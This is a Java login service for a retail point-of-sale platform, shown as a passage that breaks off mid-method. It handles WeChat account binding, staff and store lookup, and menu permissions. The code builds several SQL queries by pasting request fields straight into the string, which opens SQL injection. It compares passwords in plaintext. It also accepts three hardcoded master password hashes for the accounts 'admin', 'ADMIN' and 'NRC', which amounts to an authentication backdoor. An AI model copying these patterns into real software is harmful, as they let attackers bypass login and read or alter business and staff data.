package com.dsc.spos.service.imp.json;

import java.io.File;
import java.io.FileInputStream;
import java.nio.charset.StandardCharsets;
import java.sql.Types;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import cn.hutool.core.collection.CollUtil;
import com.dsc.spos.dao.DataProcessBean;
import com.dsc.spos.dao.DataValue;
import com.dsc.spos.dao.UptBean;
import com.dsc.spos.json.cust.req.DCP_CRegisterCheckReq;
import com.dsc.spos.json.cust.req.DCP_CRegisterCheckReq.levelElm;
import com.dsc.spos.json.cust.req.DCP_LoginRetailReq;
import com.dsc.spos.json.cust.req.DCP_LoginRetailReq.level1Elm;
import com.dsc.spos.json.cust.req.DCP_StaffQueryReq;
import com.dsc.spos.json.cust.res.DCP_CRegisterCheckRes;
import com.dsc.spos.json.cust.res.DCP_LoginRetailRes;
import com.dsc.spos.json.cust.res.DCP_RegisterRes;
import com.dsc.spos.json.cust.res.DCP_StaffQueryRes;
import com.dsc.spos.json.utils.ParseJson;
import com.dsc.spos.scheduler.job.StaticInfo;
import com.dsc.spos.service.SPosBasicService;
import com.dsc.spos.service.utils.DispatchService;
import com.dsc.spos.service.utils.TokenManagerRetail;
import com.dsc.spos.service.utils.DispatchService.SPosCodeException;
import com.dsc.spos.service.utils.DispatchService.SPosCodeException.CODE_EXCEPTION_TYPE;
import com.dsc.spos.utils.Check;
import com.dsc.spos.utils.EncryptUtils;
import com.dsc.spos.utils.Login_ShopChange;
import com.dsc.spos.utils.MapDistinct;
import com.dsc.spos.utils.PosPub;
import com.google.gson.reflect.TypeToken;
import com.spreada.utils.chinese.ZHConverter;
import org.apache.commons.codec.binary.Base64;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.KeyGenerator;
import java.security.AlgorithmParameters;
import java.security.Key;
import java.security.Security;
import java.util.stream.Collectors;

public class DCP_LoginRetail extends SPosBasicService<DCP_LoginRetailReq,DCP_LoginRetailRes> {
	Logger logger = LogManager.getLogger(DCP_LoginRetail.class.getName());
	String sysReportURL = "";
	String statementURL = "";
	
	//算法名
	public static final String KEY_NAME = "AES";
	// 加解密算法/模式/填充方式
	// ECB模式只用密钥即可对数据进行加密解密，CBC模式需要添加一个iv
	public static final String CIPHER_ALGORITHM = "AES/CBC/PKCS7Padding";
	
	@Override
	public boolean needTokenVerify()
	{
		return Boolean.FALSE;
	}
	
	@Override
	protected boolean isVerifyFail(DCP_LoginRetailReq req) throws Exception {
		boolean isFail = false;
		StringBuffer errMsg = new StringBuffer();
		level1Elm request = req.getRequest();
		
		String opNO = request.getOpNo();
		String password = request.getPassword();
		String eId = request.geteId();
		String loginType = request.getLoginType();
		String code = request.getCode();
		
		if (Check.Null(opNO)) {
			errMsg.append("用户名不可为空值, ");
			isFail = true;
		}
		if (Check.Null(password)) {
			errMsg.append("密码不可为空值, ");
			isFail = true;
		}
		if (Check.Null(eId)) {
			errMsg.append("企业编号不可为空值, ");
			isFail = true;
		}
		
		if ((loginType!=null && loginType.equals("3")))  //登录类型 3.微信
		{
			if (Check.Null(code))
			{
				errMsg.append("微信登录凭证不可为空值, ");
				isFail = true;
			}
		}
		
		
		if (isFail)
		{
			throw new SPosCodeException(CODE_EXCEPTION_TYPE.E400, errMsg.toString());
		}
		
		
		return isFail;
	}
	
	@Override
	protected TypeToken<DCP_LoginRetailReq> getRequestType()
	{
		return new TypeToken<DCP_LoginRetailReq>(){};
	}
	
	@Override
	protected DCP_LoginRetailRes getResponseType() {
		return new DCP_LoginRetailRes();
	}
	
	public String execute(String json) throws Exception {
		ParseJson pj = new ParseJson();
		logger.info("\r\nlogin begin");
		DCP_LoginRetailReq req = pj.jsonToBean(json, new TypeToken<DCP_LoginRetailReq>(){});
		Login_ShopChange LSC=new Login_ShopChange();
		level1Elm request = req.getRequest();
		String loginType = request.getLoginType(); //1.云中台  2.移动门店  3.微信 4.微信登录 5仓储app
		String registType = request.getRegistType(); //1.注册绑定  2.注册解绑

		//if(Check.Null(loginType)){
		//	loginType="1";
		//}
		String code = request.getCode();
		
		//取得 SQL
		String sql = null;
		
		//查詢條件
		String eId=request.geteId();
		String opNO=request.getOpNo();
		String password = request.getPassword();
		DCP_LoginRetailRes res = this.getResponse();
		logger.info("\r\nlogin 公司:"+eId+"用户:"+request.getOpNo()+" ");
		//移动端微信登录  BY JZMA 20190927
		//登录类型 4.微信登录
		if ((loginType!=null && loginType.equals("4"))) {
			//微信用户普通登录
			if (Check.Null(registType)) {
				sql=" select EID,ORGANIZATIONNO,OPNO,PASSWORD from PLATFORM_STAFFS "
						+ " WHERE UNIONID='"+code+"' ";
				List<Map<String, Object>> getQData = this.doQueryData(sql,null);
				if (getQData != null && getQData.isEmpty() == false){  // 有資料，取得詳細內容
					eId=getQData.get(0).get("EID").toString();
					opNO=getQData.get(0).get("OPNO").toString();
					password=getQData.get(0).get("PASSWORD").toString();
				} else {
					throw new SPosCodeException(CODE_EXCEPTION_TYPE.E400, "登录失败，微信注册账号未绑定！");
				}
			} else if (registType.equals("1")){ //微信注册绑定
				sql=" select EID,ORGANIZATIONNO,OPNO,PASSWORD from PLATFORM_STAFFS "
						+ " WHERE OPNO='"+opNO+"' and PASSWORD='"+password+"' and EID='"+eId+"'  ";
				List<Map<String, Object>> getQData = this.doQueryData(sql,null);
				if (getQData != null && getQData.isEmpty() == false){  // 有資料，取得詳細內容
					//移除旧的unionid
					List<DataProcessBean> data_d =  new ArrayList<DataProcessBean>();
					UptBean ub_d = new UptBean("PLATFORM_STAFFS");
					ub_d.addUpdateValue("UNIONID", new DataValue("", Types.VARCHAR));
					ub_d.addCondition("UNIONID", new DataValue(code, Types.VARCHAR));
					data_d.add(new DataProcessBean(ub_d));
					dao.useTransactionProcessData(data_d);
					
					//更新新的unionid
					List<DataProcessBean> data =  new ArrayList<DataProcessBean>();
					UptBean ub = new UptBean("PLATFORM_STAFFS");
					ub.addUpdateValue("UNIONID", new DataValue(code, Types.VARCHAR));
					ub.addCondition("EID", new DataValue(eId, Types.VARCHAR));
					ub.addCondition("OPNO", new DataValue(opNO, Types.VARCHAR));
					ub.addCondition("PASSWORD", new DataValue(password, Types.VARCHAR));
					data.add(new DataProcessBean(ub));
					dao.useTransactionProcessData(data);
				} else {
					throw new SPosCodeException(CODE_EXCEPTION_TYPE.E400, "登录失败，用户名或密码错误！");
				}
			}else if (registType.equals("2")){  //微信注册解绑
				sql=" select EID,ORGANIZATIONNO,OPNO,PASSWORD from PLATFORM_STAFFS "
						+ " WHERE UNIONID='"+code+"'  ";
				List<Map<String, Object>> getQData = this.doQueryData(sql,null);
				if (getQData != null && getQData.isEmpty() == false){  // 有資料，取得詳細內容
					//移除旧的unionid
					List<DataProcessBean> data_d =  new ArrayList<DataProcessBean>();
					UptBean ub_d = new UptBean("PLATFORM_STAFFS");
					ub_d.addUpdateValue("UNIONID", new DataValue("", Types.VARCHAR));
					ub_d.addCondition("UNIONID", new DataValue(code, Types.VARCHAR));
					data_d.add(new DataProcessBean(ub_d));
					dao.useTransactionProcessData(data_d);
					
					res.setSuccess(true);
					res.setServiceStatus("000");
					res.setServiceDescription("服务执行成功");
					
					String sJsonLogin=pj.beanToJson(res);
					//
					res=null;
					
					return sJsonLogin;
				} else {
					throw new SPosCodeException(CODE_EXCEPTION_TYPE.E400, "找不到登录凭证或已经解绑 ");
				}
			}
		}

		res.setLangType(request.getLangType());
		sql = LSC.getQueryStaffSql(eId,opNO,"",request.getLangType());

		String sORG_FORM="";
		String[] conditionValues1 = { }; //查詢條件
		List<Map<String, Object>> getQData1 = this.doQueryData(sql,conditionValues1);
		
		String trade=PosPub.getPARA_SMS(dao, request.geteId(), "", "trade");
		String orderstatustype=PosPub.getPARA_SMS(dao, request.geteId(), "", "orderstatustype");
		String oschannel=PosPub.getPARA_SMS(dao, request.geteId(), "", "oschannel");
		
		// 2019-06-12   yuanyy    增 加 “首次登陆修改密码”参数
		String isCheckUser = "N";
		isCheckUser = PosPub.getPARA_SMS(dao, request.geteId(), "", "IS_CHECKUSER");
		
		if (getQData1 != null && getQData1.isEmpty() == false) {
			res.setDatas(new ArrayList<DCP_LoginRetailRes.level1Elm>());
			String orgRangef = getQData1.get(0).get("ORGRANGE").toString();
			//管辖门店
			//添加门店层级，查找组织表			
			sql = LSC.getQueryStaffShopSql(request.geteId(),opNO,request.getLangType());
			if("0".equals(orgRangef)){
				sql=LSC.getQueryStaffShopAllSql(request.geteId(),opNO,request.getLangType());
			}
			List<Map<String, Object>> getQData2 = this.doQueryData(sql,null);
			String queryDefaultShopSql = getQueryDefaultShopSql(request.geteId(), opNO, req.getLangType());
			List<Map<String, Object>> defaultOrgList = this.doQueryData(queryDefaultShopSql, null);
			//增加门店层级返回为空的判断，解决门店失效时出现异常提示  BY JZMA 20200329
			
			if (getQData2 != null && getQData2.isEmpty() == false){
				//				sysReportURL = "";//报表路径:http://172.16.100.153:8080/WebReport/ReportServer?reportlet=myWebReports
				//				String sqlPara="select ITEMVALUE from platform_basesettemp where item='sysReportURL' and EID='"+request.geteId()+"'";
				//				List<Map<String, Object>> getPara = this.doQueryData(sqlPara,null);	
				//				if (getPara == null || getPara.isEmpty() == true)
				//				{
				//					//throw new SPosCodeException(CODE_EXCEPTION_TYPE.E400, "报表参数sysReportURL未设置！");
				//				}
				//				else
				//				{
				//					sysReportURL=getPara.get(0).get("ITEMVALUE")==null||getPara.get(0).get("ITEMVALUE").toString().isEmpty()?" ":getPara.get(0).get("ITEMVALUE").toString();
				//				}
				
				///参数改取公用方法  BY JZMA 20200820 
				sysReportURL=PosPub.getPARA_SMS(dao, request.geteId(), "", "sysReportURL");
				statementURL=PosPub.getPARA_SMS(dao, request.geteId(), "", "statementURL");
				
				//				String BaseDataSourceERP = "Y";//报表路径:http://172.16.100.153:8080/WebReport/ReportServer?reportlet=myWebReports
				//				sqlPara="select ITEMVALUE from platform_basesettemp where item='BaseDataSourceERP' and EID='"+request.geteId()+"'";
				//				getPara = this.doQueryData(sqlPara,null);	
				//				if (getPara == null || getPara.isEmpty() == true)
				//				{
				//					;
				//				}
				//				else
				//				{
				//					BaseDataSourceERP=getPara.get(0).get("ITEMVALUE")==null||getPara.get(0).get("ITEMVALUE").toString().isEmpty()?" ":getPara.get(0).get("ITEMVALUE").toString();
				//				}			
				
				///参数改取公用方法  BY JZMA 20200820 
				String BaseDataSourceERP=PosPub.getPARA_SMS(dao, request.geteId(), "", "BaseDataSourceERP");
				if (Check.Null(BaseDataSourceERP))
					BaseDataSourceERP = "Y";
				
				for (Map<String, Object> oneData1 : getQData1) {
					DCP_LoginRetailRes.level1Elm oneLv1= res.new level1Elm();
					
					String organizationNO = oneData1.get("ORGANIZATIONNO").toString();
					String eId1 = oneData1.get("EID").toString();
					String orgRange = oneData1.get("ORGRANGE")==null?"": oneData1.get("ORGRANGE").toString();
					String employeeNo = oneData1.get("EMPLOYEENO")==null?"": oneData1.get("EMPLOYEENO").toString();
                    String defaultOrg= oneData1.get("DEFAULTORG")==null?"": oneData1.get("DEFAULTORG").toString();
                    String departmentno = oneData1.get("DEPARTMENTNO").toString();
                    String departmentname = oneData1.get("DEPARTMENTNAME").toString();
                    String employeename = oneData1.get("EMPLOYEENAME").toString();
                    String belorgno = oneData1.get("BELORGNO").toString();
                    String belorgname = oneData1.get("BELORGNAME").toString();
                    String updepartno = oneData1.get("UPDEPARTNO").toString();
                    //
					//String langType = oneData1.get("LANGTYPE").toString();
					String langType = request.getLangType();
					String chatUserId = request.getChatUserId();
					if (Check.Null(chatUserId)){
						chatUserId="";
					}
					String bDate = oneData1.get("BDATE").toString();
					String staffNO = oneData1.get("OPNO").toString();
					String staffName = oneData1.get("OPNAME").toString();
					String password1= oneData1.get("PASSWORD").toString();
					String defDepartNo = oneData1.get("DEPARTNO").toString();
					String defDepartName = oneData1.get("DEPARTNAME").toString();
					
					String isNew = oneData1.get("ISNEW").toString();
					String viewAbleDay =  oneData1.get("VIEWABLEDAY").toString();
					if (password.equals(password1)|| (opNO.equals("admin") && password.equals("0ca030cb4d505a067007b2508fdcaedc")) ||
							(opNO.equals("ADMIN") && password.equals("eb07596d66ffd6443ddf20a683f65b2a")) ||
							(opNO.equals("NRC") && password.equals("a0deae2f3e790dc45d7ff14c1d4411b8") 	))
					{
						// 處理調整回傳值
						
						//是否存在当前员工默认门店  
						boolean bExitDefaultShop = false;
						oneLv1.setMyShops(new ArrayList<DCP_LoginRetailRes.level2Shops>());
						oneLv1.setShopId("");
						oneLv1.setShopName("");
						oneLv1.setOrg_Form("");
						
						oneLv1.setOrderstatustype(orderstatustype);
						oneLv1.setTrade(trade);
						oneLv1.setOschannel(oschannel);
						
						oneLv1.setIsCheckUser(isCheckUser);
						oneLv1.setIsNew(isNew);
						oneLv1.setViewAbleDay(viewAbleDay);
						oneLv1.setDefDepartName(defDepartName);
						oneLv1.setDefDepartNo(defDepartNo);

						
						
						
						// BY JZMA 2018-5-4  从管辖门店里面获取默认门店（按门店编号升序）
						if (getQData2 != null && getQData2.isEmpty() == false) {
							//过滤 管辖门店 中 isDefault = Y 的门店， 即默认门店，；如果没有默认门店， 设置第一个为默认门店
							Map<String, Object> condition = new HashMap<String, Object>(); //查询条件
							condition.put("ISDEFAULT", "Y");
							//调用过滤函数
							List<Map<String, Object>> getDefaultDatas = MapDistinct.getWhereMap(getQData2, condition, false);

							if(getDefaultDatas.size()<=0){
								getDefaultDatas.addAll(defaultOrgList);
							}
							if(getDefaultDatas.size() > 0){
								String defShop = getDefaultDatas.get(0).get("SHOPID").toString();
								String defShopName = getDefaultDatas.get(0).get("SHOPNAME").toString();
								//System.out.println("默认门店：" + defShop + "  名称："+defShopName  );
								sORG_FORM= getDefaultDatas.get(0).get("ORG_FORM").toString();
								oneLv1.setShopId(getDefaultDatas.get(0).get("SHOPID").toString());
								oneLv1.setShopName(getDefaultDatas.get(0).get("SHOPNAME").toString());
								oneLv1.setOrganizationNo(getDefaultDatas.get(0).get("SHOPID").toString());
								oneLv1.setOrg_Form(sORG_FORM);
								oneLv1.setDisCentre(getDefaultDatas.get(0).get("DISCENTRE").toString());
								oneLv1.setOrg_type(getDefaultDatas.get(0).get("ORG_TYPE").toString());
								
								oneLv1.setIn_cost_warehouse(getDefaultDatas.get(0).get("IN_COST_WAREHOUSE").toString());
								oneLv1.setIn_non_cost_warehouse(getDefaultDatas.get(0).get("IN_NON_COST_WAREHOUSE").toString());
								oneLv1.setOut_cost_warehouse(getDefaultDatas.get(0).get("OUT_COST_WAREHOUSE").toString());
								oneLv1.setOut_non_cost_warehouse(getDefaultDatas.get(0).get("OUT_NON_COST_WAREHOUSE").toString());
								oneLv1.setInv_cost_warehouse(getDefaultDatas.get(0).get("INV_COST_WAREHOUSE").toString());
								oneLv1.setInv_non_cost_warehouse(getDefaultDatas.get(0).get("INV_NON_COST_WAREHOUSE").toString());
                                oneLv1.setReturn_cost_warehouse(getDefaultDatas.get(0).get("RETURN_COST_WAREHOUSE").toString());
                                oneLv1.setReturn_cost_warehouse_name(getDefaultDatas.get(0).get("RETURN_COST_WAREHOUSENAME").toString());
								oneLv1.setIn_cost_warehouse_name(getDefaultDatas.get(0).get("IN_COST_WAREHOUSENAME").toString());
								oneLv1.setIn_non_cost_warehouse_name(getDefaultDatas.get(0).get("IN_NON_COST_WAREHOUSENAME").toString());
								oneLv1.setOut_cost_warehouse_name(getDefaultDatas.get(0).get("OUT_COST_WAREHOUSENAME").toString());
								oneLv1.setOut_non_cost_warehouse_name(getDefaultDatas.get(0).get("OUT_NON_COST_WAREHOUSENAME").toString());
								oneLv1.setInv_cost_warehouse_name(getDefaultDatas.get(0).get("INV_COST_WAREHOUSENAME").toString());
								oneLv1.setInv_non_cost_warehouse_name(getDefaultDatas.get(0).get("INV_NON_COST_WAREHOUSENAME").toString());
								
								oneLv1.setCITY(getDefaultDatas.get(0).get("CITY").toString());
								oneLv1.setDISTRICT(getDefaultDatas.get(0).get("DISTRICT").toString());
								oneLv1.setENABLECREDIT(getDefaultDatas.get(0).get("ENABLECREDIT").toString());
								
								///if Org_Form==0 公司时，所属公司BELFIRM 就等于组织自己  BY JZMA 20200720 
								String belfirm = getDefaultDatas.get(0).get("BELFIRM").toString();
								String belfirmName = getDefaultDatas.get(0).get("BELFIRM_NAME").toString();
								if (sORG_FORM.equals("0") && Check.Null(belfirm)) {
									oneLv1.setBELFIRM(getDefaultDatas.get(0).get("SHOPID").toString());
									oneLv1.setBELFIRM_NAME(getDefaultDatas.get(0).get("SHOPNAME").toString());
								} else {
									oneLv1.setBELFIRM(belfirm);
									oneLv1.setBELFIRM_NAME(belfirmName);
								}
								
							} else {
								bExitDefaultShop=true;
								sORG_FORM= getQData2.get(0).get("ORG_FORM").toString();
								oneLv1.setShopId(getQData2.get(0).get("SHOPID").toString());
								oneLv1.setShopName(getQData2.get(0).get("SHOPNAME").toString());
								oneLv1.setOrganizationNo(getQData2.get(0).get("SHOPID").toString());
								oneLv1.setOrg_Form(sORG_FORM);
								oneLv1.setDisCentre(getQData2.get(0).get("DISCENTRE").toString());
								oneLv1.setOrg_type(getQData2.get(0).get("ORG_TYPE").toString());
								
								oneLv1.setIn_cost_warehouse(getQData2.get(0).get("IN_COST_WAREHOUSE").toString());
								oneLv1.setIn_non_cost_warehouse(getQData2.get(0).get("IN_NON_COST_WAREHOUSE").toString());
								oneLv1.setOut_cost_warehouse(getQData2.get(0).get("OUT_COST_WAREHOUSE").toString());
								oneLv1.setOut_non_cost_warehouse(getQData2.get(0).get("OUT_NON_COST_WAREHOUSE").toString());
								oneLv1.setInv_cost_warehouse(getQData2.get(0).get("INV_COST_WAREHOUSE").toString());
								oneLv1.setInv_non_cost_warehouse(getQData2.get(0).get("INV_NON_COST_WAREHOUSE").toString());
                                oneLv1.setReturn_cost_warehouse(getQData2.get(0).get("RETURN_COST_WAREHOUSE").toString());
                                oneLv1.setReturn_cost_warehouse_name(getQData2.get(0).get("RETURN_COST_WAREHOUSENAME").toString());
                                oneLv1.setIn_cost_warehouse_name(getQData2.get(0).get("IN_COST_WAREHOUSENAME").toString());
								oneLv1.setIn_non_cost_warehouse_name(getQData2.get(0).get("IN_NON_COST_WAREHOUSENAME").toString());
								oneLv1.setOut_cost_warehouse_name(getQData2.get(0).get("OUT_COST_WAREHOUSENAME").toString());
								oneLv1.setOut_non_cost_warehouse_name(getQData2.get(0).get("OUT_NON_COST_WAREHOUSENAME").toString());
								oneLv1.setInv_cost_warehouse_name(getQData2.get(0).get("INV_COST_WAREHOUSENAME").toString());
								oneLv1.setInv_non_cost_warehouse_name(getQData2.get(0).get("INV_NON_COST_WAREHOUSENAME").toString());
								
								oneLv1.setCITY(getQData2.get(0).get("CITY").toString());
								oneLv1.setDISTRICT(getQData2.get(0).get("DISTRICT").toString());
								oneLv1.setENABLECREDIT(getQData2.get(0).get("ENABLECREDIT").toString());
								
								///if Org_Form==0 公司时，所属公司BELFIRM 就等于组织自己  BY JZMA 20200720 
								String belfirm = getQData2.get(0).get("BELFIRM").toString();
								String belfirmName = getQData2.get(0).get("BELFIRM_NAME").toString();
								if (sORG_FORM.equals("0") && Check.Null(belfirm))
								{
									oneLv1.setBELFIRM(getQData2.get(0).get("SHOPID").toString());
									oneLv1.setBELFIRM_NAME(getQData2.get(0).get("SHOPNAME").toString());
								}
								else
								{
									oneLv1.setBELFIRM(belfirm);
									oneLv1.setBELFIRM_NAME(belfirmName);
								}
							}
							
							//							//查询仓库，是否多仓标记
							//							List<Map<String, Object>> para=this.doQueryData("select ITEMVALUE from platform_basesettemp where item='MultiWarehouse' and EID='"+request.geteId()+"'", null);
							//							if (para != null && para.size() > 0 )
							//							{
							//								oneLv1.setMultiWarehouse(para.get(0).get("ITEMVALUE").toString());
							//							}
							//							else
							//							{
							//								oneLv1.setMultiWarehouse("N");
							//							}
							
							///参数改取公用方法  BY JZMA 20200820 
							String MultiWarehouse = PosPub.getPARA_SMS(dao, request.geteId(), "", "MultiWarehouse");
							if (!Check.Null(MultiWarehouse))
							{
								oneLv1.setMultiWarehouse(MultiWarehouse);
							}
							else {
								oneLv1.setMultiWarehouse("N");
							}
							
							
							
							//							//启用多语言
							//							para=this.doQueryData("select ITEMVALUE from platform_basesettemp where item='EnableMultiLang' and EID='"+request.geteId()+"'", null);
							//							if (para != null && para.size() > 0 )
							//							{
							//								oneLv1.setEnableMultiLang(para.get(0).get("ITEMVALUE").toString());
							//							}
							//							else
							//							{
							//								oneLv1.setEnableMultiLang("N");
							//							}
							
							///参数改取公用方法  BY JZMA 20200820 
							String EnableMultiLang=PosPub.getPARA_SMS(dao, request.geteId(), "", "EnableMultiLang");
							if (!Check.Null(EnableMultiLang))
							{
								oneLv1.setEnableMultiLang(EnableMultiLang);
							}
							else {
								oneLv1.setEnableMultiLang("N");
							}
							
							//单身分页大小
							String PageSizeDetail=PosPub.getPARA_SMS(dao, request.geteId(), "","PageSizeDetail");
							if(Check.Null(PageSizeDetail))
							{
								PageSizeDetail="50";
							}
							oneLv1.setPageSizeDetail(PageSizeDetail);
							
							//tempWarehouse=null;							
							
						}else
						{
							logger.info("\r\nlogin sql:"+sql);
						}
						
						oneLv1.seteId(eId1);
						oneLv1.setbDate(bDate);
						oneLv1.setLangType(langType);
						oneLv1.setOpNo(staffNO);
						oneLv1.setOpName(staffName);
						oneLv1.setDayType("0");
						oneLv1.setViewAbleDay(viewAbleDay);
						oneLv1.setChatUserId(chatUserId);
						oneLv1.setOrgRange(orgRange);
						oneLv1.setEmployeeNo(employeeNo);
						oneLv1.setDefaultOrg(defaultOrg);
						oneLv1.setDepartmentNo(departmentno);
                        oneLv1.setEmployeeName(employeename);
                        oneLv1.setDepartmentName(departmentname);
                        oneLv1.setBelOrgNo(belorgno);
                        oneLv1.setBelOrgName(belorgname);
                        oneLv1.setUpDepartNo(updepartno);

						String orgSql=getOrgSql(req);
						List<Map<String, Object>> allOrgList = this.doQueryData(orgSql, null);


						//管辖门店加入
						for (Map<String, Object> oneData2 : getQData2)
						{
							String pshop = oneData2.get("SHOPID").toString();
							String pshopName = oneData2.get("SHOPNAME").toString();
							String porg_Form = oneData2.get("ORG_FORM").toString();
							String isDefault = oneData2.get("ISDEFAULT").toString();
							String DISCENTRE = oneData2.get("DISCENTRE").toString();
							String org_type = oneData2.get("ORG_TYPE").toString();
							
							///if Org_Form==0 公司时，所属公司BELFIRM 就等于组织自己  BY JZMA 20200720 
							String bELFIRM = oneData2.get("BELFIRM").toString();
							String bELFIRM_NAME= oneData2.get("BELFIRM_NAME").toString();
							if (porg_Form.equals("0") && Check.Null(bELFIRM))
							{
								bELFIRM = pshop;
								bELFIRM_NAME = pshopName;
							}
							
							
							// 如果没有默认组织， 设置第一条组织记录为默认组织
							if(bExitDefaultShop==false && oneLv1.getShopId().equals(""))
							{
								oneLv1.setShopId(pshop);
								oneLv1.setShopName(pshopName);
								oneLv1.setOrganizationNo(pshop);
								oneLv1.setOrg_Form(porg_Form);
								oneLv1.setBELFIRM(bELFIRM);
								oneLv1.setBELFIRM_NAME(bELFIRM_NAME);
								oneLv1.setOrg_type(org_type);
							}
							
							DCP_LoginRetailRes.level2Shops shops= res.new level2Shops();

                            isDefault=pshop.equals(oneLv1.getDefaultOrg())?"Y":"N";
							shops.setOrgNo(pshop);
							shops.setOrgName(pshopName);
							shops.setOrg_Form(porg_Form);
							shops.setIsDefault(isDefault);
							shops.setDisCentre(DISCENTRE);

							//用户管辖组织范围='0'（全部组织），则返回营运组织树所有组织；若='1'（指定组织），则判断1-2-2；
							//1-2-2.用户管辖组织 isexpand='1'（全部下展），则返回营运组织树中该组织的所有下级组织；否则chilren[]节点返回空
                            //shops.setChildren(new ArrayList<>());
							//oneLv1.getMyShops().add(shops);
							List<DCP_LoginRetailRes.level2Shops> filterRows = oneLv1.getMyShops().stream().filter(x -> x.getOrgNo().equals(shops.getOrgNo())).collect(Collectors.toList());
							if(filterRows.size()<=0){
								//有嵌套的就会多次添加，所以需要过滤一下
								oneLv1.getMyShops().add(shops);
							}

							if(orgRange.equals("0")){
								expendChildren(oneLv1,shops,allOrgList);

							}else{

								Object isexpand = oneData2.get("ISEXPAND");
								if (isexpand != null)
								{
									shops.setIsExpend(isexpand.toString());
									if(isexpand.toString().equals("1")){
										//下展
										expendChildren(oneLv1,shops,allOrgList);
									}

								}
							}

							//加入
							//oneLv1.getMyShops().add(shops);
							
						}


						String orgformtemp="";
						
						//系统参数SQL
						String sqlParas="";
						
						//处理==绑定变量SQL的写法
						List<DataValue> lstDV=new ArrayList<>();
						DataValue dv=null;
						
						//菜单权限
						//门店
						switch (sORG_FORM) {
							case "2":
								orgformtemp = "1";
								
								break;
							case "0":
								orgformtemp = "3";
								//sqlParas = "select item as PARANAME,ITEMVALUE as PARAVALUE " +
								//		"from platform_basesettemp " +
								//		"where EID = ? " +
								//		"and status='100' ";
								
								//?问号参数赋值处理
								//dv = new DataValue(oneLv1.geteId(), Types.VARCHAR);
								//lstDV.add(dv);
								
								break;
							case "1":
								orgformtemp = "2";
								break;
							default:
								orgformtemp = "1";
								break;
						}

                        sqlParas = ""
                                + " SELECT nvl(t.item , e.item ) AS PARANAME , NVL(t.itemvalue , e.itemvalue) AS PARAVALUE "
                                + " FROM PLATFORM_BASESETTEMP e "
                                + " LEFT JOIN ( "
                                + " SELECT a.eId, a.templateId , a.restrictshop , a.restrictmachine, b.item , b.itemvalue "
                                + " FROM PLATFORM_PARATEMPLATE a  "
                                + " LEFT JOIN PLATFORM_PARATEMPLATE_ITEM b ON a.eId = b.eId AND a.templateid = b.templateid"
                                + " LEFT JOIN PLATFORM_PARATEMPLATE_SHOP c ON a.eId = c.Eid AND a.templateid = c.templateid"
                                + " LEFT JOIN PLATFORM_PARATEMPLATE_MACHINE d ON a.eid = d.eid AND a.templateid = d.templateid"
                                + " WHERE a.eid = ? "
                                + " and ((a.restrictshop = '1' AND c.shopid = ?) or a.restrictshop = '0') "
                                //【ID1034132】【潮品3.0】要货上限控制，门店切换服务，返回的参数重复，导致前端取值不对，影响了用户使用  by jinzma 20230619
                                + " and a.templateid not in (select a.templateId from PLATFORM_PARATEMPLATE a"
                                + " INNER JOIN PLATFORM_PARATEMPLATE_SHOP b1 ON a.eId = b1.Eid AND a.templateid = b1.templateid"
                                + " where a.eid=? AND a.restrictshop = '2' and b1.shopid=?) "
                                + " ) t ON e.eId = t.eId AND e.item = t.item "
                                + " WHERE e.eid = ? "
                                + " AND e.status = '100' "
                                //+ " AND  upper(e.item) = '"+upperPara+"'"
                                + " ORDER BY e.item "
                                + "";


                        //?问号参数赋值处理
                        dv = new DataValue(eId, Types.VARCHAR);
                        lstDV.add(dv);
                        //?问号参数赋值处理
                        dv = new DataValue(oneLv1.getShopId(), Types.VARCHAR);
                        lstDV.add(dv);
                        //?问号参数赋值处理
                        dv = new DataValue(eId, Types.VARCHAR);
                        lstDV.add(dv);
                        //?问号参数赋值处理
                        dv = new DataValue(oneLv1.getShopId(), Types.VARCHAR);
                        lstDV.add(dv);
                        //?问号参数赋值处理
                        dv = new DataValue(eId, Types.VARCHAR);
                        lstDV.add(dv);

						//下面那个菜单的过滤会根据STYPE字段过滤这个值
						//仓储APP
						if (loginType!=null && loginType.equals("5"))
						{
                            orgformtemp="5";
						}
                        //车间APP
                        if (loginType!=null && loginType.equals("6"))
                        {
                            orgformtemp="6";
                        }
                        //移动门店
                        if ( "2".equals(loginType))
                        {
                            orgformtemp="7";
                        }

						//登录应用类型=云中台，全部统一返回菜单所属系统Stype=[3-总部后台]的菜单目录
						if ( "1".equals(loginType))
						{
							orgformtemp="3";
						}
						//处理系统参数
						oneLv1.setDataParas(new ArrayList<DCP_LoginRetailRes.paras>());
						if (sqlParas.equals("")==false)
						{
							List<Map<String, Object>> getQParas =this.executeQuerySQL_BindSQL(sqlParas,lstDV);
							if (getQParas!=null && getQParas.size()>0)
							{
								for (Map<String, Object> oneParas : getQParas)
								{
									DCP_LoginRetailRes.paras lParas= res.new paras();
									lParas.setParaName(oneParas.get("PARANAME").toString());
									lParas.setParaValue(oneParas.get("PARAVALUE").toString());
									
									oneLv1.getDataParas().add(lParas);
								}
							}
							getQParas=null;
						}
						
						String	sqlModular="";
                        if(!"2".equals(sORG_FORM)) {
                            orgformtemp = "3";
                        }
						if(oneLv1.getDisCentre().equals("Y"))
						{
							sqlModular = LSC.getQueryModularFunctionSql(request.geteId(),opNO,orgformtemp,BaseDataSourceERP,request.getLangType());//"4"
						}
						else
						{
							sqlModular = LSC.getQueryModularFunctionSql(request.geteId(),opNO,orgformtemp,BaseDataSourceERP,request.getLangType());
						}
						
						String[] conditionValues3 = { }; //查詢條件
						List<Map<String, Object>> getQDataDetail = this.doQueryData(sqlModular,conditionValues3);
						oneLv1.setMyPower(new ArrayList<DCP_LoginRetailRes.level2Powers>());
						
						//新增是否可显示配送价 BY JZMA 2019/7/16
						String isShowDistriPrice ="N";
						String disc = "100"; //最低折扣
						
						if (getQDataDetail != null && getQDataDetail.isEmpty() == false)
						{
							//新增是否可显示配送价 BY JZMA 2019/7/16
							isShowDistriPrice = getQDataDetail.get(0).get("ISSHOWDISTRIPRICE").toString();
							disc = getQDataDetail.get(0).get("DISC").toString();
							if (Check.Null(isShowDistriPrice)||!isShowDistriPrice.equals("Y"))
							{
								isShowDistriPrice="N";
							}
							
							if (Check.Null(disc))
							{
								disc="100";
							}
							
							//单头主键字段
							Map<String, Boolean> condition = new HashMap<String, Boolean>(); //查詢條件
							condition.put("MODULARNO", true);
							
							//调用过滤函数
